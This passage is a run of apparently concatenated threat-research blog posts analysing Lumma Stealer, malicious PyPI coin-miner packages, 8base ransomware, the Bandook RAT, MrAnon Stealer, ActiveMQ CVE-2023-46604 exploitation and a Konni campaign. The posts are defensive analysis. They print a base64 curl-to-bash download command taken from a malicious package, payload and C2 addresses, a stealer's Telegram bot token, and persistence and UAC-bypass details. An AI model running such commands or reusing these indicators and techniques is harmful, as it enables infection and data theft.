15). Lumma stealer is a type of malware that can steal sensitive information from a user’s computer. It can target the system data, the browsers, crypto wallets, and browser extensions. It is written in C language and sold on underground forums. To elude detection and analysis, it employs diverse obfuscation techniques. The malware establishes communication with a command and control server, facilitating the exchange of instructions and transmitting pilfered data. Figure 16 shows the method to contact a command and control (C2) server. Once it gets the first server that can set up a connection, it then sends out a POST message with hardcoded User-Agent “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36“ and parameter “act=life” to check-in. The corresponding code is shown in Figure 17. Next, it sends a POST request with the Lumma ID and “act=receive-message,” shown in Figure 18. Then, the compressed stolen data is uploaded to the C2 server with URI “/api.” Although the version is still “4.0,” Lumma Stealer has recently updated its exfiltration to leverage HTTPS to better evade detection. In this attack, the malicious actor targets YouTube channels to disseminate Lumma Stealer. The crafted installation ZIP file serves as an effective bait to deliver the payload, exploiting the user's intention to install the application and prompting them to click the installation file without hesitation. URLs from open-source websites throughout the scheme aim to diminish user awareness. The attackers further deploy a private .NET loader with environment checks, various anti-virtual machine (Anti-VM), and anti-debugging functions. Users must exercise caution regarding unclear application sources and ensure legitimate applications from reputable and secure origins are used.

    "title": "Three New Malicious PyPI Packages Deploy CoinMiner on Linux Devices",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-pypi-packages-deploy-coinminer-on-linux-devices",
    "content": "FortiGuard Labs Threat Research Affected platforms:LinuxAffected parties:Linux users that have these malicious packages installedImpact:Latency in device performanceSeverity level:High On December 5th, 2023, FortiGuard's AI-driven OSS malware detection system identified three intriguing PyPI (Python Package Index) packages. These packages, upon initial use, deploy a CoinMiner executable on Linux devices. Leveraging our historical malware database, we noted that the indicators of compromise (IoCs) for these packages bear a resemblance to the \"culturestreak\" PyPI package discovered earlier this September. A comprehensive overview of the attack pattern of \"culturestreak\" was previously detailed in a Checkmarxblog post. In this analysis, we cover the attack phases of these three new packages, focusing on their similarities and developments compared to \"culturestreak.\" These three harmful packages are named modularseven-1.0, driftme-1.0, and catme-1.0. They all originate from the same author, known as \"sastra\", who created a PyPI account shortly before uploading the first of these malicious packages. These packages all exhibit a common attack methodology, so we will use driftme-1.0 as an example to illustrate the stages of the attack. Echoing the approach of the earlier \"culturestreak\" package, these packages conceal their payload, effectively reducing the detectability of their malicious code by hosting it on a remote URL. The payload is then incrementally released in various stages to execute its malicious activities. The malicious activity is triggered by the “import” statement in the __init__.py file: The processor.py module contains thefirst stageof the malicious payload: By calling the processing() function, it decodes the string Y3VybCBodHRwczovL3BhcGljdWxvLm5ldC91bm1pLnNoIHwgYmFzaA== into a shell command that fetches the content from the specified URL using curl. It then pipes that content directly to the Bash shell, which executes the following script: Looking into the “unmi.sh” script, we found that it contains thesecond stageof the malicious payload: Utilizing the “unmi.sh” script, the attacker downloads two critical items onto the user’s device: The first is “config.json,” a configuration file required for executing the program that will be installed. This file outlines the cryptocurrency mining setting. Specifically, it determines the mining algorithm, i.e., randomX, the device resource settings for mining operations, and the designated mining \"pools,\" along with the beneficiary’s wallet account. Notably, the attacker has chosen to disable the \"init-avx2\" feature, presumably to ensure compatibility with older devices. The second key component of the payload is the CoinMiner executable: Similar to the configuration file, this executable is also hosted at a remote address: hxxps://gitlab.com/ajo9082734/Mine/-/raw/main/X Once the executable is downloaded from the remote URL and marked as executable, the attacker employs the “nohup” command to execute it in the background. This ensures the process remains active beyond the terminal session. The most deceptive aspect is that the attacker ensures that all these modifications are appended to the ~/.bashrc file, ensuring the reactivation of this malicious activity whenever the user initiates a new Bash shell session. The coinMiner ELF file, retrieved during this process, is not new to the security community. It was initially uploaded to VirusTotal (VT) in 2021. Currently, a significant number of vendors on VT recognize the payload as malicious. The three packages discussed in this blog have IoCs similar to “culturestreak”: These three packages, when compared to \"culturestreak,\" showcase enhanced strategies in both concealing their presence and maintaining their malicious functions. A key enhancement is the introduction of an extra stage, where crucial commands for the malicious operations are stored in the “unmi.sh” file on a remote server. This tactic improves the odds of evading detection by security solutions by minimizing the code within the PyPI package. It also allows for more controlled disclosure of the malicious code by simply disabling the server hosting this “unmi.sh” script. Moreover, this malware inserts the malicious commands into the ~/.bashrc file. This addition ensures the malware's persistence and reactivation on the user's device, effectively extending the duration of its covert operation. This strategy aids in the prolonged, stealthy exploitation of the user's device for the attacker's benefit. A notable trend we observed from this particular set of packages is that malicious actors continuously refine their strategies to conceal and lengthen the exploitation process. An essential tactic discussed in this blog involves breaking down the entire malicious workflow into smaller stages and releasing them incrementally. For the security community, the ability to detect subtle malicious indicators becomes crucial. Furthermore, this serves as a reminder of the critical importance of thoroughly scrutinizing code and packages sourced from unverified or suspicious origins and staying well-informed about potential threats.

    "title": "Ransomware Roundup - 8base",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-8base",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the 8base ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High 8base is a financially motivated ransomware variant most likely based on the Phobos ransomware. Per our FortiRecon information, the 8base ransomware first appeared in May 2023. FortiGuard Labs has observed SmokeLoader variants delivering the 8base ransomware. Such SmokeLoader samples include bab3c87cac6db1700f0a0babaa31f5cd544961d1b9ec03fd8bcdeff837fc9755 and ea6adefdd2be00d0c7072a9abe188ba9b0c9a75fa57f13a654caeaaf4c3f5fbc. The 8base ransomware may also rely on other distribution methods. According to data collected through Fortinet'sFortiRecon service, the 8base ransomware has targeted multiple industry verticals (Figure 2). The ransomware most impacted business services, followed by the manufacturing and construction sectors. When victim organizations are ranked according to country (Figure 3), the United States leads by a wide margin. Once the ransomware is executed, it looks for files to encrypt. It skips files if the filename contains one of the following strings: info.hta (ransom note) info.txt (ransom note) boot.ini bootfont.bin ntldr ntdetect.com io.sys recov It also avoids the following folders: The ransomware avoids encrypting files inside the Caches folder, most likely because doing so may lead to software problems. It also tries to kill the following processes before encrypting files: msftesql.exe sqlagent.exe sqlbrowser.exe sqlservr.exe sqlwriter.exe oracle.exe ocssd.exe dbsnmp.exe synctime.exe agntsvc.exe mydesktopqos.exe isqlplussvc.exe xfssvccon.exe mydesktopservice.exe ocautoupds.exe agntsvc.exe agntsvc.exe agntsvc.exe encsvc.exe firefoxconfig.exe tbirdconfig.exe ocomm.exe mysqld.exe mysqld-nt.exe mysqld-opt.exe dbeng50.exe sqbcoreservice.exe excel.exe infopath.exe msaccess.exe mspub.exe onenote.exe outlook.exe powerpnt.exe steam.exe thebat.exe thebat64.exe thunderbird.exe visio.exe winword.exe wordpad.exe Killing these processes ensures that any files open in them, such as MS Office files, will be closed so the ransomware can encrypt them. The 8base ransomware also checks for file size, with a threshold set at 1.5MB. The ransomware fully encrypts files smaller than 1.5MB. On the other hand, it partially encrypts files larger than 1.5MB, most likely to increase the encryption speed. The encryption speed is often a subject of competition among ransomware developers because they want to encrypt as many files as possible before the victim becomes aware of the infection. To elaborate a bit, the ransomware injects blocks comprised of 0x40000 null bytes into various parts of the final output/encrypted file, starting at the beginning of the file. It also encrypts the last 0xC0000 bytes (with additional encrypted metadata) and may leave other parts of the file unencrypted. The ransomware then uses AES to encrypt any target files discovered and adds a file extension that includes the attacker’s contact email address “.id[unique ID assigned to the victim].[removed@rexsdata.pro].8base”. In the middle of November 2023, we came across a different version of the 8base ransomware (SHA2: 45de59851d68929632346d6f894dc8c1b6a5c4197db83c2e33c60631efc0b39f). This variant is written in C instead of the .NET used in older variants. This recent 8base ransomware variant excludes the same files and folders from file encryption, but after encrypting files, it displays a significantly longer ransom note than the one used in the .NET variants. The ransom note includes a contact email address and a TOR data leak site address not included in previous ransom notes. It also adds a new file extension to the files it encrypts, “.id[unique ID assigned to the victim].[recovery8files@(removed).org].8base”. The 8base ransomware group owns a TOR site where victims can contact the threat actor. The stolen information was released through various file storage/sharing services such as Gofile, Pixeldrain, files.dp.ua, AnonFiles, Anonym File, and Mega. The 8base ransomware TOR site includes a victim list, contact form, FAQ, and terms of service. Fortinet customers are already protected from this malware variant through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the 8base ransomware samples with the following AV signatures: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR.

ea6adefdd2be00d0c7072a9abe188ba9b0c9a75fa57f13a654caeaaf4c3f5fbc Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Remote attackers gain control of the infected systemsSeverity Level:Critical Bandook malware is a remote access trojan that has been continuously developed since it was first detected in 2007. It has been used in various campaigns by different threat actors over the years. FortiGuard Labs identified a new Bandook variant being distributed via a PDF file this past October. This PDF file contains a shortened URL that downloads a password-protected .7z file. After the victim extracts the malware with the password in the PDF file, the malware injects its payload into msinfo32.exe. In this article, we will briefly introduce Bandook’s behavior, provide detailed information about the modified elements of this new variant, and share some examples of the mechanism of its C2 communication. The injector component decrypts the payload in the resource table and injects it into msinfo32.exe. Before the injection, a registry key is created to control the behavior of the payload. The key name is the PID of msinfo32.exe, and the value contains the control code for the payload. Once executed with any argument, Bandook creates a registry key containing another control code that enables its payload to establish persistence, and it then injects the payload into a new process of msinfo32.exe. There are two registry keys, shown in Figure 1. A variant reported in 2021 required four control codes and created four processes of explorer.exe that it injected in a single execution. This new variant uses less control code and makes a more precise division of tasks. Figure 2 is the overview of the payload. Once injected, the payload initializes strings for the key names of registries, flags, APIs, etc. After this, it uses the PID of the injected msinfo32.exe to find the registry key and then decodes and parses the key value to perform the task specified by the control code. Figure 3 shows the relationship between the key value and the payload’s behavior. The control codes play the same role as previous variants, but strings are used instead of numbers. The variant we found in October 2023 has two additional control codes, but its injector doesn’t create registries for them. One asks the payload to load fcd.dll, which is downloaded by another injected process and calls fcd.dll’s Init function. The other mechanism establishes persistence and executes Bandook’s copy. These unused control codes have been removed from even newer variants (430b9e91a0936978757eb8c493d06cbd2869f4e332ae00be0b759f2f229ca8ce). Of the two remaining control codes, “ACG” is the main control code for an attack, while “GUM” establishes the persistence mechanism. When the control code is “GUM,” Bandook drops a copy to the SMC folder in the appdata folder as “SMC.exe” or “SMC.cpl” and creates a registry key to automatically execute the copy. There are three registry keys to run SMC.exe. Software\\Microsoft\\Windows\\CurrentVersion\\RunKey name: SMCValue: %APPDATA%\\SMC\\SMC.exe Software\\Microsoft\\Windows NT\\CurrentVersion\\WinlogonKey name: shellValue: explorer.exe, %APPDATA%\\SMC\\SMC.exe Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Key name: LoadValue: short path of %APPDATA%\\SMC\\SMC.exe When the copy is SMC.cpl, the registry key and value are the following: Software\\Microsoft\\Windows\\CurrentVersion\\RunKey name: SMCValue: %windir%\\System32\\controll.exe %APPDATA%\\SMC\\SMC.cpl When the control code is ACG, the payload can download files for other modules, including fcd.dll, pcd.dll, an executable file, and others. This is an optional function based on flags set when the payload initializes. The files can also be downloaded from the C2 server when necessary. If fcd.dll is downloaded, Bandook calls its functions and passes the key names of the registry key as arguments. Similarly, many registry keys store information used in other actions. An action may separated into several parts, and it’s necessary to piece all related commands and registry keys together. For example, C2 communication may use one command to write a registry key and a separate command to read it. First, Bandook sends victim information to its C2 server: If the C2 server is available, Bandook receives commands from the server, including *DJDSR^, @0001, @0002, and so on. While the string sequence in the newest variants reaches @0155, some are only used when sending a result to the server, and others only exist in other modules. As shown in Figure 5, the payload doesn’t use the command @0133, though it can be found in fcd.dll. Despite the numbering, the payload only supports 139 actions. In addition, some special commands are only sent to the server under specific conditions. Since most actions are the same as in previous variants, we will focus on communications between Bandook and the C2 server using the new commands added to the most recent variants. These actions can be roughly categorized as file manipulation, registry manipulation, download, information stealing, file execution, invocation of functions in dlls from the C2, controlling the victim’s computer, process killing, and uninstalling the malware. The data from the C2 server has the following format: {Command}~!{Arg2}~!{Arg3}~!{Arg4}~!{Arg5}~!{Arg6}~! The first argument is the command, which is necessary. Arg2 to Arg6 are optional. Below are four examples of actions that require multiple commands and actions that have complex mechanisms. @0003, @0004 This action is about file reading. If Arg3 is R, it keeps calling the Sleep function until the C2 server sends @0004 and its related arguments to Bandook. The @0004 command gives a value to determine from where to read the file or to just do nothing. Finally, Bandook sends the file specified by Arg2 to the C2 server. @0006, @0007 This action is about file writing. Similar to @0003, @0006 waits for @0007. @0007 determines how to write data from the C2 server to a local file. @0126, @0127, @0128 This action executes a Python file. The main command is @0128, which calls a ShellExecute function to run a Python file {Parent directory}\\Lib\\dpx.pyc with arguments Arg2~Arg6. The {Parent directory} is stored in the registry key pthma under HKCU\\Software. @0126 checks pthma’s value and sends the result to the server. @0127 writes its Arg2 to pthma if fcd.dll is initialized in the victim’s computer. Additionally, some commands send special data to the server: @0124 This action monitors the victim’s screen and controls the computer. When Bandook receives this command, it overwrites the config file of Firefox pref.js with code hard-coded in the payload and disables protection mechanisms in Microsoft Edge: Registry Key name Value Software\\Microsoft\\Internet Explorer TabProcGrowth 0 NoProtectedModeBanner 1 Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3 2500 3 After this, Bandook creates a virtual desktop and assigns it to a newly created thread (Thread_Control) that establishes a new communication with the C2 server. It first sends the string AVE_MARIA, followed by another packet containing the number 1, to the server. If the server responds, Bandook creates another thread to keep sending screenshots to the server. This thread also sends two packets: the string AVE_MARIA and the number 0. In the meantime, Thread_Control receives coordinates and control codes from the server. These tasks include: In addition, there are three new commands compared to the 2021 variant: @0138 This writes encrypted backup URLs to the registry key kPYXM under HKCU\\Software\\AkZhAyV0\\. When the current C2 server is unavailable, Bandook will decrypt it and try to access the URLs. The format of the decrypted data will look like this: {URL}|{URL}|{URL}| Bandook will extract URLs and try these sequentially if the previous URL is unavailable. @0139 This command asks Bandook to parse cookies from the browser specified by the C2, including Chrome, Edge, and Firefox, and save the result as Default.json in a .zip file. @0140 In the previous variant, @0140 is missing. This command asks Bandook to establish a persistence mechanism with sub_13160400, also called when the control code is GUM, as shown in Figure 9. This article unveils new details about the C2 mechanism of this long-existing malware and the new features in its latest variant. A large number of commands for C2 communication can be found in this malware. However, the tasks performed by its payload are fewer than the number in the command. This is because multiple commands are used for a single action, some commands call functions in other modules, and some are only used to respond to the server. Though the entire system is not observed in this attack, FortiGuard will continue monitoring malware variants and provide appropriate protections. The malware described in this report are detected and blocked by FortiGuard Antivirus as: PDF/Agent.1F56!trW32/Injector.EQDO!trW32/Bandok.NAT!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The information collected can be used for future attacksSeverity Level:High FortiGuard Labs recently identified an email phishing campaign using deceptive booking information to entice victims into clicking on a malicious PDF file. The PDF downloads a .NET executable file created with PowerGUI and then runs a PowerShell script to fetch the final malware, known as MrAnon Stealer. This malware is a Python-based information stealer compressed with cx-Freeze to evade detection. MrAnon Stealer steals its victims' credentials, system information, browser sessions, and cryptocurrency extensions. Figure 1 illustrates the attack flow. The downloader URL was mostly queried in Germany, which suggests it was the primary target of the attack. The number of queries for this URL rose significantly in November 2023, implying the campaign was more active and aggressive during that month. In this article, we will detail the behavior of this malware at each stage. The attacker, masquerading as a company looking to reserve hotel rooms, sends phishing emails with the subject, “December Room Availability Query.” The body contains bogus hotel booking details for the holiday season. The attached malicious PDF file has a downloader link hidden in the stream object. Its data after decoding is shown below: Using the strings in the class “Loader,” we identified that the malware used the PowerShell script editor that converts PowerShell scripts to Microsoft executable files. Upon examination of the .NET executable file shown in Figure 6, we found that it utilizes ScriptRunner.dll to extract “Scripts.zip” to obtain a PowerShell script. The extracted file is deposited at the following location: “%USERPROFILE%\\AppData\\Local\\Temp\\Quest Software\\PowerGUI”. This .NET Microsoft Windows executable is solely tasked with unpacking an embedded script named “down2.ps1” and executing it using PowerShell.exe. The packed file and PowerShell configurations are within the resources section of the file, as illustrated in Figure 7. The script initiates the loading of a Windows Form and configures its settings, including form, label, and progress bar. Additionally, it defines text within the execution of the subsequent script to mitigate user suspicions. Within the \"Form Load event\" section, the script retrieves a payload from the identical domain, “anonbin[.]ir,” and decompresses the file in the temporary folder. It then locates the execution file within the zip archive and employs “Start-Process” for execution. A window named “File Not Supported” is displayed in this state, accompanied by a status message indicating “Not Run: python.exe.” This deceptive presentation is designed to mislead users into believing that the malware has not been executed successfully. Figure 10 illustrates the window and progress bar during the execution of the malware. The compressed file “Ads-Pro-V6-Free-Trail (1).zip” includes multiple files. Figure 11 shows the contents of the extracted folder. Within this folder, two DLL files serve as clean components to facilitate the loading of additional Python code by the “python.exe” process. Figure 12 illustrates the WinMain function in “python.exe,” clearly indicating that this is not a legitimate Python executable. Tracing the initial call reveals that the execution file originates from cx_Freeze tools. The script then searches for the directory “\\lib\\library.zip” and uses “PyObject_CallObject” to invoke the malicious Python code. Figure 15 shows the files from “library.zip.” Notably, “cstgversion__main__.pyc” stands out due to its distinct creation time compared to the legitimate files. This particular file encompasses the primary functions responsible for data theft. First, the malware verifies whether the following processes are currently running on the system and terminates them if they exist: “ArmoryQt.exe”, “Atomic Wallet.exe”, “brave.exe”, “bytecoin-gui.exe”, “chrome.exe”, “Coinomi.exe”, “Discord.exe”, “DiscordCanary.exe”, “Element.exe”, “Exodus.exe”, “firefox.exe”, “Guarda.exe”, “KeePassXC.exe”, “NordVPN.exe”, “OpenVPNConnect.exe”, “seamonkey.exe”, “Signal.exe”, “Telegram.exe”, “filezilla.exe”, “filezilla-server-gui.exe”, “keepassxc-proxy.exe”, “msedge.exe”, “nordvpn-service.exe”, “opera.exe”, “steam.exe”, “walletd.exe”, “waterfox.exe”, “yandex.exe” It then uses “ImageGrab” to capture a screenshot, saving it with the filename “Screenshot (Username ).png.” Additionally, it establishes connections with legitimate websites such as “api.ipify.org” and “geolocation-db.com/jsonp” to retrieve the system’s IP address, country name, and country code. It also gathers information from the following sources: Next, it compresses the stolen data, secures it with a password, and designates the filename as “Log (Username).zip.” The compressed file is then uploaded to a public file-sharing website using the URL “hxxps://store1[.]gofile[.]io/uploadFile.” Finally, it appends the download link and system information to a message that is sent to the attacker's Telegram channel using the bot token “6799784870:AAHEU6EUdnAjRcH8Qq0TCokNtVJSL06VmbU.” The support channel for MrAnon Stealer is shown in Figure 18. This support channel promotes its product, provides enhanced capabilities, and includes a purchase page at “hxxp[:]//anoncrypter[.]com” for all associated tools (Figure 19). The malicious actor established the website “anonbin[.]ir” earlier this year, as shown in Figure 20, and downloaded all associated files. Upon investigation, we discovered analogous packed files utilizing cx_Freeze from July. These files consistently feature Python-based stealers, identified by the shared \"HYDRA\" banner within the code, as illustrated in Figure 21. The campaign initially disseminated Cstealer in July and August but transitioned to distributing MrAnon Stealer in October and November. This pattern suggests a strategic approach involving the continued use of phishing emails to propagate a variety of Python-based stealers. In this attack, the threat attacker sends phishing emails with fake room booking details, aiming at specific regions. The malware uses PowerGUI and cx-Freeze tools to create a complex process that involves .NET executable files and PowerShell scripts. The attacker also uses tricks like false error messages to hide successful infection. The malware downloads and extracts files from a specific domain to run a harmful Python script. The script extracts clean DLL files and malware named “python.exe.” These are used to cover up the loading of the malicious payload—MrAnon Stealer. It steals data and sensitive information from several applications and then compresses and uploads the stolen data to a public file-sharing website and the threat actor’s Telegram channel.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Any OS running Apache Active MQ versions prior to 5.15.16, 5.16.7, 5.17.6, and 5.18.3Impacted Parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical This past October, Apache issued a criticaladvisoryaddressing CVE-2023-46604, a vulnerability involving the deserialization of untrusted data in Apache. On November 2, the Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2023-46604 to its known exploited list,KEV Catalog, indicating this vulnerability's high risk and impact. Fortiguard Labs also released anoutbreak alertand athreat signal reportabout the active exploitation of CVE-2023-46604, providing more details and recommendations for mitigation. Technical details and proof-of-concept (PoC) code for CVE-2023-46604 are publicly available, making it easier for attackers to exploit this vulnerability. In recent weeks, Fortiguard Labs has detected numerous threat actors exploiting CVE-2023-46604 to disseminate diverse strains of malware. Our analysis has unveiled the emergence of a newly discovered Golang-based botnet named GoTitan and a .NET program called \"PrCtrl Rat,\" equipped with remote control capabilities. Additionally, we have identified other well-known malware and tools in play. Initially developed as an advanced penetration testing tool and red teaming framework, Sliver supports various callback protocols, including DNS, TCP, and HTTP(S), streamlining egress processes. Kinsing has solidified its position in cryptojacking operations, showcasing its ability to quickly capitalize on newly discovered vulnerabilities. Meanwhile, Ddostf, with a history dating back to 2016, continues to exhibit its proficiency in executing targeted Distributed Denial of Service (DDoS) attacks. This article will detail the exploitation and provide insights into the malware associated with these recent attacks. The attacker initiates a connection to ActiveMQ through the OpenWire protocol, typically on port 61616. By transmitting a crafted packet, the attacker triggers the system to unmarshal a class under their control. This action, in turn, prompts the vulnerable server to retrieve and load a class configuration XML file from a specified remote URL, requiring the presence of a predefined XML file hosted externally. The known exploitation of this vulnerability involves leveraging the “ClassPathXmlApplicationContext” to load a malicious XML application configuration file from a network location via HTTP. Figure 1 shows the captured attacking traffic. The malicious XML file defines the arbitrary code intended to execute on the compromised machine. Attackers can set parameters like “cmd” or “bash” to achieve code execution on the remote vulnerable server (Figure 2). In the following sections, we will explain how the malware works and what it does on infected systems. GoTitan is a new botnet discovered earlier this month. It is written in the Go programming language and is downloaded from a malicious URL, “hxxp://91.92.242.14/main-linux-amd64s”. The attacker only provides binaries for x64 architectures, and the malware performs some checks before running. It also creates a file named \"c.log\" that records the execution time and program status. This file seems to be a debug log for the developer, which suggests that GoTitan is still in an early stage of development. It replicates itself as “/.mod” within the system and establishes a recurring execution by registering in the cron. It then retrieves the C2 IP address and gathers essential information about the compromised endpoint, including architecture, memory, and CPU details. Compiling all the collected data using “<==>” as separators, it transmits its collected information to the C2 server. The C2 message initiates with the hard coded string “Titan<==>”. GoTitan communicates with its C2 server by sending “\\xFE\\xFE” as a heartbeat signal and waiting for further instructions. When it receives a command, it passes it to a function named “handle_socket_func2” that determines an attack method. GoTitan supports ten different methods of launching distributed denial-of-service (DDoS) attacks: UDP, UDP HEX, TCP, TLS, RAW, HTTP GET, HTTP POST, HTTP HEAD, and HTTP PUT. Sliver, an open-source penetration testing tool developed in the Go language and available on GitHub, possesses the potential for misuse when wielded by threat actors due to its diverse features catering to each stage of penetration testing. Threat actors can leverage Sliver to compromise and control multiple targets across various platforms and architectures. The tool enables the generation of customized implants designed to elude detection, allowing for the execution of commands, file uploads and downloads, screenshot capture, and more on infected systems. When communicating with the C2 server at “91[.]92[.]240[.]41” via HTTP requests, Sliver dynamically selects decoders for C2 messages based on parameters in the URI. Additionally, Sliver supports various encoders, including Base32, Base58, Base64, English encoder, Gzip, Hex, and PNG. The encoded C2 communication in HTTP protocol is shown in Figure 8. The attacker retrieves the execution file from “hxxp://199[.]231[.]186[.]249:8000/unifo.dat” and stores it as “svc_veeam.exe”. The file 'unifo.dat' is a .Net framework program initially labeled as “prcli.exe” that was created in August and still spread via CVE-2023-46604. Figure 10 shows the PDB path and detailed information. For persistence, it adds “Security Service” with the current process into the registry “HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run.” It then starts the connection to C2 server “173[.]214[.]167[.]155.” Once the command is received from a remote server, it checks for a length of four. If not, it exits the program. It supports five commands: As of this writing, we have yet to receive any messages from the server, and the motive behind disseminating this tool remains unclear. However, once it infiltrates a user's environment, the remote server gains control over the system. Kinsing fetches the bash script from “194[.]38[.]22[.]53/acb.sh.” It serves the following purposes: The batch script used by Ddostf is retrieved from “hxxp://42[.]121[.]111[.]112:81/xml.sh.” It configures the history log with “+o” to prevent the recording of the current session. It then installs curl to download additional execution files and eliminate any traces. The executable file “tomcat” includes the recognizable string “ddos.tf” and the Base64-encoded string for “v8.ter.tf.” Its characteristics align with those of a threat actor who had targeted China in 2018. It first verifies that it has root privilege and that the process is running on the device. It then ensures that it will persist on the device by executing the command shown below. Ddostf includes a hard-coded string, “TF-Linux kernel…,” which appends either “SYN-“ or “UDP-“ in its C2 message, depending on whether the process runs with root privileges. Ddostf incorporates 13 attack methods: SYN_Flood, WZSYN_Flood, ICMP_Flood, GET_Flood, GETFT_Flood, HEAD_Flood, POST_Flood, xzcc_Flood, TCP_Flood, WZTCP_Flood, ack_Flood, WZUDP_Flood, and UDP_Flood. Additionally, it defines a function called “DNS_Flood,” which is not included in the current switch cases and is possibly intended for future enhancements. Despite the release of a patch for CVE-2023-46604 over a month ago, threat actors persist in exploiting this vulnerability to distribute malware on susceptible servers. This blog introduces newly discovered threats, including the Golang-based botnet GoTitan and the .NET program “PrCtrl Rat,” which have emerged as a consequence of this exploitation. Additionally, users should remain vigilant against ongoing exploits by Sliver, Kinsing, and Ddostf. It is crucial to prioritize system updates and patching and regularly monitor security advisories to effectively mitigate the risk of exploitation.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Remote attackers gain control of the infected systemsSeverity Level:Critical FortiGuard Labs recently identified the use of a Russian-language Word document equipped with a malicious macro in the ongoing Konni campaign. Despite the document's creation date of September, ongoing activity on the campaign's C2 server is evident in internal telemetry, as shown in Figure 1. This campaign relies on aremote access trojan (RAT)capable of extracting information and executing commands on compromised devices. Operating for several years, this campaign employs diverse strategies for initial access, payload delivery, and establishing persistence within victims' networks. In this blog, we will elaborate on the behavior of the malware at each stage. Upon opening the document, a yellow prompt bar appears, displaying “Enable Content” alongside some ambiguous Russian text (Figure 2). Upon selecting the button, a VBA script is initiated that displays an article in Russian that translates to “Western Assessments of the Progress of the Special Military Operation.” The VBA script (Figure 3) retrieves information from “OLEFormat.IconLabel” and stores it in a temporary folder under the filename “temp.zip.” After extracting the file's contents, it runs the “check.bat” script using the “vbHide” parameter, ensuring the batch script executes without presenting a command prompt window to the user. This method is valuable when a threat actor seeks to discreetly run a script in the background, avoiding user interaction or visible windows. The initial script file, named “check.bat” (Figure 4), performs several checks. Initially, it verifies the presence of a remote connection session. If detected, it directly initiates the “netpp.bat” script. The script then assesses whether the current system is running Windows 10, assigning a value of 1 to the variable “%Num%” regardless of the outcome. This variable later plays a role in selecting the UAC bypass method. This UAC setting is different from KONNI campaigns of the past that set either 4 or 1 for different operation systems. Additionally, it examines whether the system operates on a 64-bit architecture. If so, it renames the corresponding DLL files to “netpp.dll” and “wpns.dll” and removes extraneous DLL files. Finally, it executes “wpns.dll” with three parameters: “QQQQQQQ” as the targeted entry point name, “%Num%” denoting the chosen UAC bypass method, and “netpp.bat” for further action. Each DLL file in the Word document has been compressed using UPX. We will delve into the specifics using the 64-bit version files since their 32-bit counterparts have similar functionalities. Firstly, “wpns.dll” is invoked in the batch file “check.bat.” It is primarily designed for UAC bypass. In the batch file, the parameter is configured as 1, prompting the selection of the sub_180001B90 function, as illustrated in Figure 5. It initiates the process “wusa.exe,” a legitimate Windows utility responsible for installing and uninstalling Windows updates and packages. Because it is signed and trusted by the operating system, it runs with elevated privileges without triggering User Account Control (UAC) prompts. After establishing “wusa.exe,” it then duplicates its access token and proceeds to execute a specified command using “CreateProcessWithLogonW” using that token. Finally, it runs a “netpp.bat” script that inherits the elevated privileges. A segment of the code is shown in Figure 6. Figure 7 shows the content of the batch file \"netpp.bat.\" Here is a concise explanation of its functions: Initially, the program verifies several Windows API functions across various libraries, as shown in Figure 8. If it succeeds in loading those functions, the program continues; otherwise, it returns 